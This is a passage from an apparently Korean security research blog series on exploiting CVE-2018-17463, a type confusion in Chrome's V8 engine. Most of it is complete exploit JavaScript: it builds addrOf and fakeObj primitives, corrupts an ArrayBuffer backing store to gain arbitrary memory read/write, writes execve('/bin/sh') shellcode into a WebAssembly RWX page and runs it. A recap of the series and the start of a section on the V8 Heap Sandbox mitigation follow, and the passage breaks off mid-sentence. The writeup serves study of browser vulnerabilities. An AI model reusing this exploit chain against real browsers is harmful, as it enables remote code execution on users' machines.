properties</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeObj</span>(<span class="hljs-params">pValues</span>) </span>{    <span class="hljs-keyword">let</span> obj = {        inline: <span class="hljs-number">1234</span>    };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function to find overlapping properties</span><span class="hljs-keyword">let</span> p1, p2;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlappingProperties</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">let</span> pNames = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            <span class="hljs-subst">${pNames.map((p) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${p}</span> = obj.<span class="hljs-subst">${p}</span>;`</span>).join(<span class="hljs-string">&apos;\n&apos;</span>)}</span></span><span class="hljs-string">            return [<span class="hljs-subst">${pNames.join(<span class="hljs-string">&apos;, &apos;</span>)}</span>];</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-comment">// Return address of an object as a BigInt</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            return obj.p<span class="hljs-subst">${p1}</span>.x1;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p2] = { <span class="hljs-attr">y</span>: obj };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>;}<span class="hljs-comment">// Function to write data to obj address</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">            obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">            return orig;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>;}<span class="hljs-comment">// Find Overlapping Properties</span>print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>);<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1);<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>];<span class="hljs-comment">// Memory Read and Write Primitives</span><span class="hljs-keyword">let</span> memory = {    write(addr, bytes) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);        view2.set(bytes);    },    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    },    addrOf(obj) {        arrBuf2.leakMe = obj;        <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;    }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);<span class="hljs-comment">// Generate RWX region via WASM</span>print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;<span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Linux x64 Shellcode to execute /bin/sh</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>,                   <span class="hljs-comment">// push 59 (syscall number for execve)</span>    <span class="hljs-number">0x58</span>,                         <span class="hljs-comment">// pop rax</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>,            <span class="hljs-comment">// xor rdx, rdx (envp = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,            <span class="hljs-comment">// xor rsi, rsi (argv = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// movabs rdi, &quot;/bin/sh\x00&quot;</span>    <span class="hljs-number">0x57</span>,                         <span class="hljs-comment">// push rdi</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,            <span class="hljs-comment">// mov rdi, rsp</span>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>                    <span class="hljs-comment">// syscall</span>]);print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode</span>memory.write(wasmRWXAddr, shellcode);print(<span class="hljs-string">&quot;[+] Spawning Shell...&quot;</span>);<span class="hljs-comment">// Execute Shellcode</span>func();</code></pre><h3 id="&#xACB0;&#xACFC;"><a href="#&#xACB0;&#xACFC;" class="headerlink" title="&#xACB0;&#xACFC;"></a>&#xACB0;&#xACFC;</h3><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC704;&#xCE58;&#xD55C; Wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; exploit&#xC774;&#xBBC0;&#xB85C; &#xC708;&#xB3C4;&#xC6B0; &#xCF54;&#xB4DC;&#xB97C; &#xB9AC;&#xB205;&#xC2A4;&#xB85C; &#xD3EC;&#xD305;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xC258;&#xCF54;&#xB4DC;&#xB9CC; &#xBCC0;&#xACBD;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xB744;&#xC6B0;&#xB294; &#xC258;&#xCF54;&#xB4DC;&#xB97C; shell &#xC744; &#xB744;&#xC6B0;&#xB294; &#xC258;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xACBD;&#xD574;&#xC11C; Linux &#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Windows</li></ul><p><img src="image%203.png" alt="image.png"></p><ul><li>Linux</li></ul><p><img src="image%204.png" alt="image.png"></p><h2 id="1-4-&#xC815;&#xB9AC;"><a href="#1-4-&#xC815;&#xB9AC;" class="headerlink" title="1.4 &#xC815;&#xB9AC;"></a>1.4 &#xC815;&#xB9AC;</h2><p>Part 4.&#xB97C; &#xB2EC;&#xB824;&#xC624;&#xACE0; &#xC788;&#xB294;&#xB370; &#xAE34; &#xD638;&#xD761;&#xC774;&#xC5C8;&#xC73C;&#xB2C8; &#xD55C;&#xBC88; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!(&#xB4A4;&#xC5D0; &#xB0B4;&#xC6A9;&#xC774; &#xB354; &#xC788;&#xAC70;&#xB4E0;&#xC694; &#x314E;.&#x314E;)</p><p>Part 1&#xC5D0;&#xC11C;&#xB294; Chrome &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xC640; V8&#xC744; &#xC774;&#xD574;&#xD558;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xAE30;&#xCD08; &#xAC1C;&#xB150;&#xC744; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 2&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC758; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC744; &#xB54C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4;&#xC774; &#xB0B4;&#xBD80; &#xD0C0;&#xC785;&#xC744; &#xC798;&#xBABB; &#xD574;&#xC11D;&#xD558;&#xB294; &#xC774;&#xC720;&#xC640; &#xADF8;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC704;&#xD5D8;&#xC744; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 3 ~ Part 4(&#xC911;&#xAC04;;&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;)&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC5B4;&#xB5BB;&#xAC8C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xAD6C;&#xCD95;&#xB418;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB4E4;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xC5B4;&#xC838; &#xC2E4;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAE34; &#xD638;&#xD761;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB7;&#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xB744;&#xC6CC; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC5EC;&#xB7EC; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB97C; &#xB178;&#xB9B4; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xADF8; &#xBCA1;&#xD130;&#xB4E4;&#xC744; &#xC870;&#xD569;&#xD558;&#xBA74; heap &#xC0C1;&#xC758; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xC911; &#xD558;&#xB098;&#xC778; Type Confusion&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xBA70; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xACE0;, &#xAD81;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE)&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xD750;&#xB984;&#xC744; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4;, &#xAE30;&#xC220;&#xC801; &#xAD00;&#xC810;&#xC5D0;&#xC11C; CVE-2018-17463&#xC5D0; &#xB300;&#xD55C; exploit&#xC740; &#xB450; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCDE8;&#xC57D;&#xC810; &#x2192; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xAD6C;&#xCD95; &#xB2E8;&#xACC4;: Type Confusion&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC548;&#xC815;&#xC801;&#xC778; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(&#xBA54;&#xBAA8;&#xB9AC;) &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB0B4;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC6D0;&#xB9AC;&#xC640; &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80; &#xB3D9;&#xC791; &#xC774;&#xD574;&#xAC00; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#x2192; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(weaponizing&#xB7;pwn) &#xB2E8;&#xACC4;: &#xD655;&#xBCF4;&#xD55C; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;(RWX)&#xB97C; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xC2E4;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB2E8;&#xACC4;&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC778; pwnable/exploit &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC758; &#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC989;, <strong>CVE-2018-17463</strong> &#xC0AC;&#xB840;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBCF4;&#xBA74;, Type Confusion&#xC744; &#xD1B5;&#xD574; Memory Read/Write primitive&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC77C;&#xAE4C;&#xC9C0;&#xAC00; &#x2018;&#xCDE8;&#xC57D;&#xC810;&#xB7;&#xC5D4;&#xC9C4; &#xB808;&#xBCA8;&#xC758; &#xC5F0;&#xAD6C;&#x2019;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xACE0;, &#xADF8; &#xC774;&#xD6C4; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB7;&#xC810;&#xD504;&#xD14C;&#xC774;&#xBE14;&#xC744; &#xB36E;&#xC5B4;&#xC368; &#xC2E4;&#xC81C; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xBCF4;&#xB2E4; pwnable&#xD55C; &#xC791;&#xC5C5;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC790; pwnable&#xC744; &#xACF5;&#xBD80;&#xD558;&#xC168;&#xB358; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xC81C; &#xAC10;&#xC774; &#xC2AC;&#xC2AC; &#xC624;&#xC2E4; &#xC218;&#xB3C4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB7F0; exploit&#xC774; &#xB098;&#xC624;&#xBA74; &#xC5ED;&#xC0AC;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xC5C7;&#xC774; &#xB098;&#xC654;&#xC8E0;?! &#xBC14;&#xB85C; mitigation &#xC785;&#xB2C8;&#xB2E4; :( </p><p><del>(&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB294; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xC6C3;&#xC5B4;&#xC57C; &#xD560; &#xC9C0; &#xC6B8;&#xC5B4;&#xC57C; &#xD560; &#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694; &#x1F602;)</del></p><p>V8&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC758;&#xB3C4;&#xC640; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Type Confusion&#xACFC; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xACBD;&#xC6B0;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xC544;&#xC11C; 2020&#xB144; &#xCD08;&#xC5D0; V8&#xC5D0; Heap Sandbox&#xB77C;&#xB294; mitigation&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Heap Sandbox&#xAC00; &#xBB34;&#xC5C7;&#xC774;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC644;&#xD654;&#xB41C;&#xAC74;&#xC9C0; &#xACC4;&#xC18D; &#xC0B4;&#xD3B4;&#xBCF4;&#xB7EC;&#xAC00;&#xC2DC;&#xC8E0;! &#x314E;.&#x314E;</p><h1 id="2-V8-Heap-Sandbox"><a href="#2-V8-Heap-Sandbox" class="headerlink" title="2. V8 Heap Sandbox"></a>2. V8 Heap Sandbox</h1><p>2&#xC7A5;&#xC5D0;&#xC11C; &#xB9D0;&#xD558;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB294; &#xD06C;&#xB86C; &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC544;&#xB2CC; &#xB80C;&#xB354;&#xB9C1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;, &#xC989; V8 &#xC5D0;&#xC11C;&#xC758; &#xD799; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="2-1-Motivation"><a href="#2-1-Motivation" class="headerlink" title="2.1 Motivation"></a>2.1 Motivation</h2><p><img src="image%205.png" alt="image.png"></p><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xB098;&#xC624;&#xAE30; &#xBA87; &#xB144; &#xAC04; Chrome &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; 60% &#xC774;&#xC0C1;&#xC774; V8&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84;&#xC740; &#xACE0;&#xC804;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xADF8;(UAF, OOB)&#xAC00; &#xC544;&#xB2C8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB098; &#xB7F0;&#xD0C0;&#xC784; &#xCF54;&#xB4DC; &#xB0B4;&#xC758; &#xBBF8;&#xBB18;&#xD55C; &#xB17C;&#xB9AC;&#xC801; &#xBC84;&#xADF8;&#xB098;, &#xC774; &#xB17C;&#xB9AC;&#xC801; &#xBC84;&#xADF8;&#xB97C; &#xC774;&#xC6A9;&#xD55C; memory corruption&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBC84;&#xADF8;&#xB294; &#xAC1C;&#xBC1C;(&#xCF54;&#xB529;)&#xC744; &#xC798;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xB9C9;&#xC744; &#xC218; 